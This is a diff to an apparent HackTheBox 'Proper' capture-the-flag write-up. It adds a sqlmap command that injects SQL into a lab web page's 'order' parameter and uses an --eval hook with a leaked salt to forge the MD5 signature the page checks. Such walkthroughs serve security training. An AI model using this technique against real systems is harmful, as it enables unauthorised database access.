@@ -74,7 +74,7 @@
 
 // Lets try to remove 'h' parameter
 
-// Now we get the same error but this time we get also with crash details
+// Now we get the same error but this time we get also crash details
 
 ![Image 7]()
 
@@ -123,7 +123,13 @@
 
 // It worked !
 
+// Now that we know the salt worked we can proceed to [sqlmap](https://github.com/sqlmapproject/sqlmap)tool with [this](https://securitypadawan.blogspot.com/2014/01/using-sqlmaps-eval-functionality-for.html) help to understand.
 
+$sqlmap -u http://10.10.10.231/products-ajax.php?order=id+asc&h=181345bd7fce37aad011ea65a41b60c8 -p order --eval="import hashlib ; h=hashlib.md5(('hie0shah6ooNoim'+order).encode('utf-8')).hexdigest()" -v 5 --dbs
+
+
+
+https://github.com/evyatar9/Writeups/tree/master/HackTheBox/Proper
 
 http://10.10.10.231/products-ajax.php?order=id+desc&h=9094e65be4a9dc27cd4af70674a99c64
 
